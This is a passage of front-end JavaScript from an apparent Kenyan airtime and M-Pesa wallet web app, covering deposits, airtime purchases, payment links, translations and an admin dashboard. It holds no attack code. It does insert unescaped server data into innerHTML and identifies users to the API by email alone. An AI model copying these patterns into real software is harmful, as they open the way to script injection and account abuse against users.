                console.error('Failed to load transactions:', error);
            }
        }

        function renderTransactions(transactions) {
            const renderList = (containerId, limit = null) => {
                const container = document.getElementById(containerId);
                const txToShow = limit ? transactions.slice(0, limit) : transactions;
                if (txToShow.length === 0) {
                    container.innerHTML = '<div class="empty-state"><i class="fas fa-inbox"></i><h3>No transactions</h3><p>Your transactions will appear here</p></div>';
                    return;
                }
                container.innerHTML = txToShow.map(tx => {
                    let iconClass = tx.type === 'deposit' ? 'deposit' : 'airtime';
                    if (tx.status === 'failed' || tx.status === 'cancelled') iconClass = 'failed';
                    if (tx.status === 'pending') iconClass = 'pending';
                    const icon = tx.type === 'deposit' ? 'fa-arrow-down' : 'fa-mobile-alt';
                    
                    let statusClass = 'status-pending';
                    let statusLabel = tx.status;
                    if (tx.status === 'completed') {
                        statusClass = 'status-completed';
                        statusLabel = 'Completed';
                    } else if (tx.status === 'pending') {
                        statusClass = 'status-pending';
                        statusLabel = 'Pending';
                    } else if (tx.status === 'failed') {
                        statusClass = 'status-failed';
                        statusLabel = 'Failed';
                    } else if (tx.status === 'cancelled') {
                        statusClass = 'status-cancelled';
                        statusLabel = 'Cancelled';
                    }
                    
                    return `
                        <div class="transaction-item">
                            <div class="transaction-info">
                                <div class="transaction-icon ${iconClass}"><i class="fas ${icon}"></i></div>
                                <div class="transaction-details">
                                    <h4>${tx.type.charAt(0).toUpperCase() + tx.type.slice(1)}</h4>
                                    <p>${tx.phone || '-'} - ${new Date(tx.created_at).toLocaleDateString()}</p>
                                </div>
                            </div>
                            <div class="transaction-amount">
                                <div class="amount" style="color: ${tx.type === 'deposit' ? 'var(--success)' : 'var(--dark)'};">
                                    ${tx.type === 'deposit' ? '+' : '-'}KES ${tx.amount}
                                </div>
                                ${tx.bonus > 0 ? `<div class="bonus">+${tx.bonus} bonus</div>` : ''}
                                <span class="status ${statusClass}">${statusLabel}</span>
                            </div>
                        </div>
                    `;
                }).join('');
            };
            renderList('recentTransactions', 5);
            renderList('allTransactions');
        }

        window.showPage = function(pageId) {
            const protectedPages = ['deposit', 'buy-airtime', 'sell-airtime', 'airtime-to-cash', 'transactions', 'verify-deposit', 'settings', 'profile'];
            if (protectedPages.includes(pageId) && !currentUser) {
                showAuthModal();
                return;
            }
            if (pageId === 'sell-airtime') checkFloatStatus();
            if (pageId === 'deposit') startDepositRefresh();
            else stopDepositRefresh();
            if (pageId === 'admin' && adminLoggedIn) {
                loadAdminData();
                startAdminAutoRefresh();
            }
            document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
            document.getElementById(`page-${pageId}`).classList.add('active');
            document.querySelectorAll('.menu-item').forEach(m => m.classList.remove('active'));
            document.querySelector(`.menu-item[onclick*="${pageId}"]`)?.classList.add('active');
            closeSidebar();
            window.scrollTo({ top: 0, behavior: 'smooth' });
        };

        window.toggleSidebar = function() {
            document.getElementById('sidebar').classList.toggle('open');
            document.querySelector('.sidebar-overlay').classList.toggle('show');
        };

        window.closeSidebar = function() {
            document.getElementById('sidebar').classList.remove('open');
            document.querySelector('.sidebar-overlay').classList.remove('show');
        };

        window.toggleNotifications = function() {
            document.getElementById('notificationPanel').classList.toggle('show');
        };

        window.showToast = function(message, type = 'info') {
            const toast = document.getElementById('toast');
            toast.className = `toast show ${type}`;
            document.getElementById('toastMessage').textContent = message;
            setTimeout(() => toast.classList.remove('show'), 4000);
        };

        window.closeModal = function(modalId) {
            document.getElementById(modalId).classList.remove('show');
        };

        function showAuthModal() {
            document.getElementById('authModal').classList.add('show');
        }

        // Network Selection and Validation for Buy Airtime
        let selectedNetworkValue = '';
        let selectedSendNetworkValue = '';

        window.selectNetwork = function(network) {
            // Remove selected class from Buy Airtime options only
            document.querySelectorAll('#buyAirtimeForm .network-option').forEach(opt => {
                opt.classList.remove('selected');
            });
            // Add selected class to clicked option
            document.querySelector(`#buyAirtimeForm .network-option[data-network="${network}"]`).classList.add('selected');
            selectedNetworkValue = network;
            document.getElementById('selectedNetwork').value = network;
            // Hide network error
            document.getElementById('networkError').classList.remove('show');
            // Validate form
            validateAirtimeForm();
        };

        // Network Selection and Validation for Send Airtime
        window.selectSendNetwork = function(network) {
            // Remove selected class from Send Airtime options only
            document.querySelectorAll('#sellAirtimeForm .network-option').forEach(opt => {
                opt.classList.remove('selected');
            });
            // Add selected class to clicked option
            document.querySelector(`#sellAirtimeForm .network-option[data-network="${network}"]`).classList.add('selected');
            selectedSendNetworkValue = network;
            document.getElementById('selectedSendNetwork').value = network;
            // Hide network error
            document.getElementById('sendNetworkError').classList.remove('show');
            // Validate form
            validateSendForm();
        };

        window.validateSendPhone = function() {
            const phoneInput = document.getElementById('sellAirtimePhone');
            const phoneError = document.getElementById('sendPhoneError');
            const phone = phoneInput.value.trim();
            
            const isValid = /^[71][0-9]{8}$/.test(phone);
            
            if (phone.length === 0) {
                phoneInput.classList.remove('valid', 'invalid');
                phoneError.classList.remove('show');
            } else if (isValid) {
                phoneInput.classList.remove('invalid');
                phoneInput.classList.add('valid');
                phoneError.classList.remove('show');
            } else {
                phoneInput.classList.remove('valid');
                phoneInput.classList.add('invalid');
                phoneError.classList.add('show');
            }
            validateSendForm();
            return isValid;
        };

        window.validateSendAmount = function() {
            const amountInput = document.getElementById('sellAirtimeAmount');
            const amountError = document.getElementById('sendAmountError');
            const amount = parseInt(amountInput.value) || 0;
            
            const isValid = amount >= 10;
            
            if (amountInput.value === '') {
                amountInput.classList.remove('valid', 'invalid');
                amountError.classList.remove('show');
            } else if (isValid) {
                amountInput.classList.remove('invalid');
                amountInput.classList.add('valid');
                amountError.classList.remove('show');
            } else {
                amountInput.classList.remove('valid');
                amountInput.classList.add('invalid');
                amountError.classList.add('show');
            }
            validateSendForm();
            return isValid;
        };

        function validateSendForm() {
            const network = document.getElementById('selectedSendNetwork').value;
            const phone = document.getElementById('sellAirtimePhone').value.trim();
            const amount = parseInt(document.getElementById('sellAirtimeAmount').value) || 0;
            
            const isNetworkSelected = network !== '';
            const isPhoneValid = /^[71][0-9]{8}$/.test(phone);
            const isAmountValid = amount >= 10;
            
            const isFormValid = isNetworkSelected && isPhoneValid && isAmountValid;
            
            // Enable/disable send buttons
            document.getElementById('sellAirtimeBalanceBtn').disabled = !isFormValid;
            
            return isFormValid;
        }

        window.validateAirtimePhone = function() {
            const phoneInput = document.getElementById('airtimePhone');
            const phoneError = document.getElementById('phoneError');
            const phone = phoneInput.value.trim();
            
            // Kenyan phone numbers start with 7 or 1 and have 9 digits
            const isValid = /^[71][0-9]{8}$/.test(phone);
            
            if (phone.length === 0) {
                phoneInput.classList.remove('valid', 'invalid');
                phoneError.classList.remove('show');
            } else if (isValid) {
                phoneInput.classList.remove('invalid');
                phoneInput.classList.add('valid');
                phoneError.classList.remove('show');
            } else {
                phoneInput.classList.remove('valid');
                phoneInput.classList.add('invalid');
                phoneError.classList.add('show');
            }
            validateAirtimeForm();
            return isValid;
        };

        window.validateAirtimeAmount = function() {
            const amountInput = document.getElementById('airtimeAmount');
            const amountError = document.getElementById('amountError');
            const amount = parseInt(amountInput.value) || 0;
            
            const isValid = amount >= 10;
            
            if (amountInput.value === '') {
                amountInput.classList.remove('valid', 'invalid');
                amountError.classList.remove('show');
            } else if (isValid) {
                amountInput.classList.remove('invalid');
                amountInput.classList.add('valid');
                amountError.classList.remove('show');
            } else {
                amountInput.classList.remove('valid');
                amountInput.classList.add('invalid');
                amountError.classList.add('show');
            }
            validateAirtimeForm();
            return isValid;
        };

        function validateAirtimeForm() {
            const network = document.getElementById('selectedNetwork').value;
            const phone = document.getElementById('airtimePhone').value.trim();
            const amount = parseInt(document.getElementById('airtimeAmount').value) || 0;
            
            const isNetworkSelected = network !== '';
            const isPhoneValid = /^[71][0-9]{8}$/.test(phone);
            const isAmountValid = amount >= 10;
            
            const isFormValid = isNetworkSelected && isPhoneValid && isAmountValid;
            
            // Enable/disable all buy buttons
            document.getElementById('buyAirtimeBtn').disabled = !isFormValid;
            document.getElementById('directPurchaseBtn').disabled = !isFormValid;
            
            return isFormValid;
        }

        // Override form submit to check network selection
        document.addEventListener('DOMContentLoaded', function() {
            const buyAirtimeForm = document.getElementById('buyAirtimeForm');
            if (buyAirtimeForm) {
                buyAirtimeForm.addEventListener('submit', function(e) {
                    if (!selectedNetworkValue) {
                        e.preventDefault();
                        document.getElementById('networkError').classList.add('show');
                        showToast('Please select a network first', 'error');
                        return false;
                    }
                    if (!validateAirtimeForm()) {
                        e.preventDefault();
                        showToast('Please fill all fields correctly', 'error');
                        return false;
                    }
                });
            }
        });

        function formatPhoneNumber(phone) {
            let cleaned = phone.replace(/\s+/g, '').replace(/[^0-9]/g, '');
            if (cleaned.startsWith('0')) {
                cleaned = '254' + cleaned.substring(1);
            } else if (cleaned.startsWith('+254')) {
                cleaned = cleaned.substring(1);
            } else if (!cleaned.startsWith('254')) {
                cleaned = '254' + cleaned;
            }
            return cleaned;
        }

        document.getElementById('depositForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            if (!currentUser) { showAuthModal(); return; }
            
            const rawPhone = document.getElementById('depositPhone').value;
            const phone = formatPhoneNumber(rawPhone);
            const amount = parseInt(document.getElementById('depositAmount').value);
            
            lastDepositPhone = rawPhone;
            lastDepositAmount = amount;
            
            if (amount < 10) { 
                showToast('Minimum deposit is KES 10', 'error'); 
                return; 
            }
            
            if (phone.length !== 12) {
                showToast('Please enter a valid phone number', 'error');
                return;
            }
            
            const btn = document.getElementById('depositStkBtn');
            btn.disabled = true;
            btn.innerHTML = '<div class="spinner"></div> Sending STK Push check your phone...';
            showLoading('Sending STK Push to ' + phone.substring(0, 6) + '...');
            
            try {
                const response = await fetch(`${API_BASE}/api/payments/deposit`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ email: currentUser.email, phone: phone, amount: amount })
                });
                const data = await response.json();
                
                hideLoading();
                
                if (data.success) {
                    currentDepositReference = data.reference;
                    showToast('STK Push sent! Enter your M-Pesa PIN.', 'success');
                    btn.innerHTML = '<div class="spinner"></div> Waiting for payment...';
                    pollDepositStatus(data.reference);
                } else {
                    showToast(data.message || 'Failed to send STK Push', 'error');
                    btn.disabled = false;
                    btn.innerHTML = '<i class="fas fa-mobile-alt"></i> Deposit via M-Pesa STK Push';
                }
            } catch (error) {
                hideLoading();
                showToast('Failed to initiate deposit. Please try again.', 'error');
                btn.disabled = false;
                btn.innerHTML = '<i class="fas fa-mobile-alt"></i> Deposit via M-Pesa STK Push';
            }
        });

        let lastDepositPhone = '';
        let lastDepositAmount = 0;

        async function pollDepositStatus(reference) {
            let attempts = 0;
            const maxAttempts = 45;
            const btn = document.getElementById('depositStkBtn');
            const retryBtn = document.getElementById('retryDepositBtn');
            const statusDiv = document.getElementById('depositStatus');
            const statusText = document.getElementById('depositStatusText');
            
            statusDiv.style.display = 'block';
            statusText.textContent = 'Waiting for M-Pesa confirmation...';
            retryBtn.classList.remove('show');
            
            const poll = setInterval(async () => {
                attempts++;
                
                if (attempts > maxAttempts) {
                    clearInterval(poll);
                    showToast('Payment confirmation delayed. Your balance will update automatically once confirmed.', 'delay');
                    btn.disabled = false;
                    btn.innerHTML = '<i class="fas fa-mobile-alt"></i> Deposit via M-Pesa STK Push';
                    statusDiv.style.display = 'none';
                    retryBtn.classList.add('show');
                    silentRefreshBalance();
                    loadTransactions();
                    return;
                }
                
                statusText.textContent = `Checking payment status... (${attempts}/${maxAttempts})`;
                
                try {
                    const response = await fetch(`${API_BASE}/api/payments/status/${reference}`);
                    const data = await response.json();
                    
                    if (data.success && data.transaction.status === 'completed') {
                        clearInterval(poll);
                        statusDiv.style.display = 'none';
                        showToast('Deposit successful! Your balance has been updated.', 'success');
                        btn.disabled = false;
                        btn.innerHTML = '<i class="fas fa-mobile-alt"></i> Deposit via M-Pesa STK Push';
                        retryBtn.classList.remove('show');
                        await silentRefreshBalance();
                        await loadTransactions();
                        await loadNotifications();
                        document.getElementById('depositForm').reset();
                    } else if (data.success && data.transaction.status === 'failed') {
                        clearInterval(poll);
                        statusDiv.style.display = 'none';
                        showToast('Payment was cancelled. Please try again.', 'cancel');
                        btn.disabled = false;
                        btn.innerHTML = '<i class="fas fa-mobile-alt"></i> Deposit via M-Pesa STK Push';
                        retryBtn.classList.add('show');
                        silentRefreshBalance();
                        loadTransactions();
                    }
                } catch (error) {
                    console.error('Poll error:', error);
                }
            }, 2000);
        }

        window.retryDeposit = function() {
            if (lastDepositPhone && lastDepositAmount > 0) {
                document.getElementById('depositPhone').value = lastDepositPhone;
                document.getElementById('depositAmount').value = lastDepositAmount;
            }
            document.getElementById('retryDepositBtn').classList.remove('show');
            document.getElementById('depositForm').dispatchEvent(new Event('submit'));
        };

        window.depositWithLink = function() {
            const rawPhone = document.getElementById('depositPhone').value;
            const amount = document.getElementById('depositAmount').value;
            const email = currentUser?.email || 'Guest';
            
            if (!rawPhone || !amount) { 
                showToast('Please enter phone number and amount', 'error'); 
                return; 
            }
            
            const phone = formatPhoneNumber(rawPhone);
            const url = `https://short.payhero.co.ke/s/oEvAxA8Xx6cDoBLxntShmF?phone=${phone}&customer_name=${encodeURIComponent(email)}&amount=${amount}&reference=${encodeURIComponent('#airtime deposit')}`;
            window.open(url, '_blank');
        };

        document.getElementById('buyAirtimeForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            if (!currentUser) { showAuthModal(); return; }
            if (!selectedNetworkValue) { 
                document.getElementById('networkError').classList.add('show');
                showToast('Please select a network first', 'error'); 
                return; 
            }
            const phone = '254' + document.getElementById('airtimePhone').value;
            const amount = parseInt(document.getElementById('airtimeAmount').value);
            if (amount < 10) { showToast('Minimum airtime is KES 10', 'error'); return; }
            const btn = document.getElementById('buyAirtimeBtn');
            btn.disabled = true;
            btn.innerHTML = '<div class="spinner"></div> Processing...';
            showBalanceOverlay();
            try {
                const response = await fetch(`${API_BASE}/api/airtime/buy`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ email: currentUser.email, phone: phone, amount: amount })
                });
                const data = await response.json();
                hideBalanceOverlay();
                if (data.success) {
                    showToast(`Airtime sent! KES ${data.airtimeSent} to ${phone}`, 'success');
                    refreshBalance();
                    loadTransactions();
                } else if (data.shortfall) {
                    pendingPurchase = { phone, amount };
                    document.getElementById('shortfallAmount').textContent = `KES ${data.shortfall}`;
                    document.getElementById('modalDepositAmount').value = Math.ceil(data.shortfall);
                    document.getElementById('modalDepositPhone').value = document.getElementById('airtimePhone').value;
                    document.getElementById('insufficientModal').classList.add('show');
                } else {
                    showToast(data.message || 'Purchase failed', 'error');
                }
            } catch (error) {
                hideBalanceOverlay();
                showToast('Failed to buy airtime check balance or contact us', 'error');
            }
            btn.disabled = false;
            btn.innerHTML = '<i class="fas fa-shopping-cart"></i> Buy Now (From your account balance)';
        });

        window.directAirtimePurchase = async function() {
            if (!selectedNetworkValue) { showToast('Please select a network first', 'error'); return; }
            const phone = document.getElementById('airtimePhone').value;
            const amount = document.getElementById('airtimeAmount').value;
            if (!phone || !amount) { showToast('Please enter phone number and amount', 'error'); return; }
            if (parseInt(amount) < 10) { showToast('Minimum airtime is KES 10', 'error'); return; }
            try {
                const response = await fetch(`${API_BASE}/api/airtime/direct`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ phone_to_receive: '254' + phone, phone_to_pay: '254' + phone, amount: parseInt(amount) })
                });
                const data = await response.json();
                if (data.success) {
                    showToast(`STK Push sent! You'll receive KES ${data.airtime_to_receive} airtime after payment.`, 'success');
                } else {
                    showToast(data.message || 'Failed', 'error');
                }
            } catch (error) {
                showToast('Failed to initiate purchase', 'error');
            }
        };

        window.buyAirtimeWithLink = function() {
            if (!selectedNetworkValue) { showToast('Please select a network first', 'error'); return; }
            const phone = document.getElementById('airtimePhone').value;
            const amount = document.getElementById('airtimeAmount').value;
            const email = currentUser?.email || 'Guest';
            if (!phone || !amount) { showToast('Please enter phone number and amount', 'error'); return; }
            if (parseInt(amount) < 10) { showToast('Minimum airtime is KES 10', 'error'); return; }
            const url = `https://short.payhero.co.ke/s/oEvAxA8Xx6cDoBLxntShmF?phone=254${phone}&customer_name=${encodeURIComponent(email)}&amount=${amount}&reference=${encodeURIComponent('#airtime purchase')}`;
            window.open(url, '_blank');
        };

        let floatAvailable = true;

        async function checkFloatStatus() {
            try {
                const response = await fetch(`${API_BASE}/api/airtime/float-status`);
                const data = await response.json();
                if (data.success) {
                    floatAvailable = !data.floatLow;
                    const statusDiv = document.getElementById('statumFloatStatus');
                    if (floatAvailable) {
                        statusDiv.innerHTML = `<p style="color: var(--success);"><i class="fas fa-check-circle"></i> Airtime service is available</p>`;
                    } else {
                        statusDiv.innerHTML = `<div style="background: linear-gradient(135deg, #fff3cd, #ffeeba); border: 1px solid #ffc107; border-radius: 12px; padding: 15px; margin-bottom: 15px;">
                            <p style="color: #856404; font-weight: 600; margin-bottom: 8px;"><i class="fas fa-exclamation-triangle"></i> Low Float Balance</p>
                            <p style="color: #856404; font-size: 0.9rem;">Our airtime float is currently low. The service will resume once the admin tops up the float. Please try again in a few minutes.</p>
                        </div>`;
                    }
                }
            } catch (error) {
                console.error('Float check error:', error);
            }
        }

        document.getElementById('sellAirtimeForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            if (!currentUser) { showAuthModal(); return; }
            if (!selectedSendNetworkValue) { 
                document.getElementById('sendNetworkError').classList.add('show');
                showToast('Please select a network first', 'error'); 
                return; 
            }
            const phone = '254' + document.getElementById('sellAirtimePhone').value;
            const amount = parseInt(document.getElementById('sellAirtimeAmount').value);
            if (amount < 10) { showToast('Minimum airtime is KES 10', 'error'); return; }
            const btn = document.getElementById('sellAirtimeBalanceBtn');
            btn.disabled = true;
            btn.innerHTML = '<div class="spinner"></div> Processing...';
            showBalanceOverlay();
            try {
                const response = await fetch(`${API_BASE}/api/airtime/buy`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ email: currentUser.email, phone: phone, amount: amount })
                });
                const data = await response.json();
                hideBalanceOverlay();
                if (data.success) {
                    let msg = `Airtime sold! KES ${data.airtimeSent || amount} to ${phone}`;
                    if (data.commission > 0) {
                        msg += `. You earned KES ${data.commission} commission!`;
                    }
                    showToast(msg, 'success');
                    refreshBalance();
                    loadTransactions();
                    document.getElementById('sellAirtimeForm').reset();
                    selectedSendNetworkValue = '';
                    document.querySelectorAll('.network-option[data-form="send"]').forEach(opt => opt.classList.remove('selected'));
                } else if (data.errorType === 'insufficient_balance' || data.shortfall) {
                    document.getElementById('insufficientShortfall').textContent = data.shortfall || (amount - (data.balance || 0));
                    document.getElementById('modalDepositAmount').value = Math.ceil(data.shortfall || (amount - (data.balance || 0)));
                    showModal('insufficientModal');
                } else {
                    showToast(data.message || 'Failed to sell airtime Reason:insufficient balance', 'error');
                }
            } catch (error) {
                hideBalanceOverlay();
                showToast('Failed to sell airtime Reason:insufficient balance', 'error');
            }
            btn.disabled = false;
            btn.innerHTML = '<i class="fas fa-wallet"></i> Sell from Balance';
        });

        window.sellAirtimeWithStk = function() {
            if (!selectedSendNetworkValue) { showToast('Please select a network first', 'error'); return; }
            const phone = document.getElementById('sellAirtimePhone').value;
            const amount = document.getElementById('sellAirtimeAmount').value;
            const email = currentUser?.email || 'Guest';
            if (!phone || !amount) { showToast('Please enter phone number and amount', 'error'); return; }
            if (parseInt(amount) < 10) { showToast('Minimum airtime is KES 10', 'error'); return; }
            if (!floatAvailable) { showToast('Airtime service temporarily unavailable.', 'error'); return; }
            const url = `https://short.payhero.co.ke/s/oEvAxA8Xx6cDoBLxntShmF?phone=254${phone}&customer_name=${encodeURIComponent(email)}&amount=${amount}&reference=${encodeURIComponent('#airtime purchase')}`;
            window.open(url, '_blank');
        };

        window.depositFromModal = async function() {
            const phone = '254' + document.getElementById('modalDepositPhone').value;
            const amount = parseInt(document.getElementById('modalDepositAmount').value);
            const btn = document.querySelector('#insufficientModal .btn-primary');
            const originalBtnHtml = btn.innerHTML;
            btn.disabled = true;
            btn.innerHTML = '<div class="spinner"></div> Sending STK Push...';
            
            try {
                const response = await fetch(`${API_BASE}/api/payments/deposit`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ email: currentUser.email, phone: phone, amount: amount })
                });
                const data = await response.json();
                if (data.success) {
                    showToast('STK Push sent! Enter your M-Pesa PIN to complete.', 'success');
                    closeModal('insufficientModal');
                    pollDepositStatus(data.reference);
                } else {
                    showToast(data.message || 'Failed', 'error');
                    btn.disabled = false;
                    btn.innerHTML = originalBtnHtml;
                }
            } catch (error) {
                showToast('Failed to initiate deposit', 'error');
                btn.disabled = false;
                btn.innerHTML = originalBtnHtml;
            }
        };

        window.depositFromModalLink = function() {
            const phone = document.getElementById('modalDepositPhone').value;
            const amount = document.getElementById('modalDepositAmount').value;
            const email = currentUser?.email || 'Guest';
            const url = `https://short.payhero.co.ke/s/oEvAxA8Xx6cDoBLxntShmF?phone=254${phone}&customer_name=${encodeURIComponent(email)}&amount=${amount}&reference=${encodeURIComponent('#airtime deposit')}`;
            window.open(url, '_blank');
            closeModal('insufficientModal');
        };

        document.getElementById('airtimeToCashForm').addEventListener('submit', (e) => {
            e.preventDefault();
            const amount = document.getElementById('a2cAmount').value;
            const phone = document.getElementById('a2cPhone').value;
            document.getElementById('dialCode').textContent = `*140*${amount}*0732202740#`;
            document.getElementById('dialCodeSection').style.display = 'block';
            document.getElementById('sambazaBtn').style.display = 'none';
            document.getElementById('doneBtn').style.display = 'block';
            localStorage.setItem('a2cPhone', '254' + phone);
            localStorage.setItem('a2cAmount', amount);
        });

        window.showVerifyA2C = function() {
            document.getElementById('verifyA2CPhone').value = localStorage.getItem('a2cPhone');
            showPage('verify-a2c');
        };

        document.getElementById('verifyA2CForm')?.addEventListener('submit', async (e) => {
            e.preventDefault();
            const phone = document.getElementById('verifyA2CPhone').value;
            const code = document.getElementById('verifyA2CCode').value;
            const whatsappUrl = `https://wa.me/254732202740?text=${encodeURIComponent(`Verification: ${code} from ${phone}`)}`;
            window.open(whatsappUrl, '_blank');
            showToast('Verification sent to WhatsApp. You will receive your cashback within 24 hours.', 'success');
        });

        document.getElementById('verifyDepositForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            if (!currentUser) { showAuthModal(); return; }
            const mpesaCode = document.getElementById('mpesaCode').value.trim();
            const btn = document.getElementById('verifyDepositBtn');
            btn.disabled = true;
            btn.innerHTML = '<div class="spinner"></div> Verifying...';
            try {
                const response = await fetch(`${API_BASE}/api/payments/verify-deposit`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ email: currentUser.email, mpesa_code: mpesaCode })
                });
                const data = await response.json();
                if (data.success) {
                    showToast(data.message, 'success');
                    refreshBalance();
                    loadTransactions();
                } else {
                    showToast(data.message || 'Verification failed', 'error');
                }
            } catch (error) {
                showToast('Verification failed', 'error');
            }
            btn.disabled = false;
            btn.innerHTML = '<i class="fas fa-search"></i> Verify Deposit';
        });

        window.downloadTransactionsPDF = function() {
            if (!currentUser) { showAuthModal(); return; }
            window.open(`${API_BASE}/api/transactions/${encodeURIComponent(currentUser.email)}/pdf`, '_blank');
        };

        document.getElementById('profileForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            const phone = '254' + document.getElementById('profilePhone').value;
            localStorage.setItem('userPhone', phone);
            showToast('Profile saved locally!', 'success');
        });

        // Translation object for English and Kiswahili
        const translations = {
            en: {
                yourBalance: 'Your Balance',
                deposit: 'Deposit',
                buyAirtime: 'Buy Airtime',
                sendAirtime: 'Send Airtime',
                airtimeToCash: 'Airtime to Cash',
                history: 'History',
                whyChooseUs: 'Why Choose Us',
                faq: 'Frequently Asked Questions',
                recentTransactions: 'Recent Transactions',
                dashboard: 'Dashboard',
                transactions: 'Transactions',
                settings: 'Settings',
                aboutUs: 'About Us',
                contactUs: 'Contact Us',
                privacyPolicy: 'Privacy Policy',
                termsOfService: 'Terms of Service',
                logout: 'Logout'
            },
            sw: {
                yourBalance: 'Salio Lako',
                deposit: 'Weka Pesa',
                buyAirtime: 'Nunua Airtime',
                sendAirtime: 'Tuma Airtime',
                airtimeToCash: 'Airtime kwa Pesa',
                history: 'Historia',
                whyChooseUs: 'Kwa Nini Uchague Sisi',
                faq: 'Maswali Yanayoulizwa Mara Kwa Mara',
                recentTransactions: 'Miamala ya Hivi Karibuni',
                dashboard: 'Dashibodi',
                transactions: 'Miamala',
                settings: 'Mipangilio',
                aboutUs: 'Kuhusu Sisi',
                contactUs: 'Wasiliana Nasi',
                privacyPolicy: 'Sera ya Faragha',
                termsOfService: 'Masharti ya Huduma',
                logout: 'Ondoka'
            }
        };

        window.changeLanguage = function(lang) {
            localStorage.setItem('language', lang);
            const trans = translations[lang] || translations.en;
            
            // Update all elements with data-translate attribute
            document.querySelectorAll('[data-translate]').forEach(el => {
                const key = el.getAttribute('data-translate');
                if (trans[key]) {
                    el.textContent = trans[key];
                }
            });
            
            showToast(lang === 'sw' ? 'Lugha imebadilishwa kuwa Kiswahili' : 'Language changed to English', 'success');
        };

        // Profile Phone Validation
        let profilePhoneCheckTimeout = null;

        window.validateProfilePhone = function() {
            const phoneInput = document.getElementById('profilePhone');
            const phoneError = document.getElementById('profilePhoneError');
            const duplicateError = document.getElementById('profilePhoneDuplicateError');
            const phone = phoneInput.value.trim();
            
            // Hide duplicate error initially
            duplicateError.classList.remove('show');
            
            // Basic format validation
            const isValid = /^[71][0-9]{8}$/.test(phone);
            
            if (phone.length === 0) {
                phoneInput.classList.remove('valid', 'invalid');
                phoneError.classList.remove('show');
            } else if (isValid) {
                phoneInput.classList.remove('invalid');
                phoneInput.classList.add('valid');
                phoneError.classList.remove('show');
                
                // Check for duplicate phone in database
                clearTimeout(profilePhoneCheckTimeout);
                profilePhoneCheckTimeout = setTimeout(async () => {
                    try {
                        const response = await fetch(`${API_BASE}/api/users/check-phone/254${phone}`);
                        const data = await response.json();
                        if (data.exists && data.email !== currentUser?.email) {
                            duplicateError.classList.add('show');
                            phoneInput.classList.remove('valid');
                            phoneInput.classList.add('invalid');
                        }
                    } catch (error) {
                        console.log('Phone check error:', error);
                    }
                }, 500);
            } else {
                phoneInput.classList.remove('valid');
                phoneInput.classList.add('invalid');
                phoneError.classList.add('show');
            }
            return isValid;
        };

        window.changeTheme = function(theme) {
            document.documentElement.setAttribute('data-theme', theme);
            localStorage.setItem('theme', theme);
        };

        window.acceptCookies = function() {
            localStorage.setItem('cookiesAccepted', 'all');
            showToast('Cookie preferences saved', 'success');
        };

        window.rejectCookies = function() {
            localStorage.setItem('cookiesAccepted', 'essential');
            showToast('Essential cookies only', 'info');
        };

        window.logout = async function() {
            try {
                await signOut(auth);
            } catch (e) {}
            localStorage.removeItem('userEmail');
            localStorage.removeItem('firebaseUid');
            localStorage.removeItem('cachedBalance');
            window.location.href = 'login.html';
        };

        document.getElementById('adminLoginForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            const password = document.getElementById('adminPassword').value;
            const btn = document.getElementById('adminLoginBtn');
            btn.disabled = true;
            btn.innerHTML = '<div class="spinner"></div> Logging in...';
            try {
                const response = await fetch(`${API_BASE}/api/admin/login`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    credentials: 'include',
                    body: JSON.stringify({ password })
                });
                const data = await response.json();
                if (data.success) {
                    adminLoggedIn = true;
                    document.getElementById('adminLogin').style.display = 'none';
                    document.getElementById('adminDashboard').style.display = 'block';
                    loadAdminData();
                    startAdminAutoRefresh();
                } else {
                    showToast(data.message || 'Login failed', 'error');
                }
            } catch (error) {
                showToast('Login failed', 'error');
            }
            btn.disabled = false;
            btn.innerHTML = '<i class="fas fa-sign-in-alt"></i> Login';
        });

        let adminRefreshInterval = null;

        function startAdminAutoRefresh() {
            if (adminRefreshInterval) clearInterval(adminRefreshInterval);
            adminRefreshInterval = setInterval(() => {
                if (adminLoggedIn) loadAdminData();
            }, 10000);
        }

        async function loadAdminData() {
            try {
                const [statsRes, usersRes, txRes, verRes, depositStatusRes, floatStatusRes] = await Promise.all([
                    fetch(`${API_BASE}/api/admin/stats`, { credentials: 'include' }),
                    fetch(`${API_BASE}/api/admin/users`, { credentials: 'include' }),
                    fetch(`${API_BASE}/api/admin/transactions`, { credentials: 'include' }),
                    fetch(`${API_BASE}/api/admin/verifications`, { credentials: 'include' }),
                    fetch(`${API_BASE}/api/settings/deposit-status`, { credentials: 'include' }),
                    fetch(`${API_BASE}/api/settings/float-status`, { credentials: 'include' })
                ]);
                const stats = await statsRes.json();
                const users = await usersRes.json();
                const tx = await txRes.json();
                const ver = await verRes.json();
                const depositStatus = await depositStatusRes.json();
                const floatStatus = await floatStatusRes.json();
                if (stats.success) {
                    document.getElementById('statTotalUsers').textContent = stats.stats.totalUsers;
                    document.getElementById('statTotalDeposits').textContent = `KES ${stats.stats.totalDeposits}`;
                    document.getElementById('statTotalAirtime').textContent = `KES ${stats.stats.totalAirtime}`;
                    document.getElementById('statPendingVerifications').textContent = stats.stats.pendingVerifications;
                }
                if (users.success) renderAdminUsers(users.users);
                if (tx.success) renderAdminTransactions(tx.transactions);
                if (ver.success) renderAdminVerifications(ver.verifications);
                if (depositStatus.success) {
                    document.getElementById('depositStatusSelect').value = depositStatus.depositDisabled ? 'true' : 'false';
                }
                if (floatStatus.success) {
                    document.getElementById('floatStatusSelect').value = floatStatus.floatLow ? 'true' : 'false';
                }
            } catch (error) {
                console.error('Failed to load admin data:', error);
            }
        }

        function renderAdminUsers(users) {
            const tbody = document.querySelector('#usersTable tbody');
            tbody.innerHTML = users.map(u => `
                <tr>
                    <td>${u.email}</td>
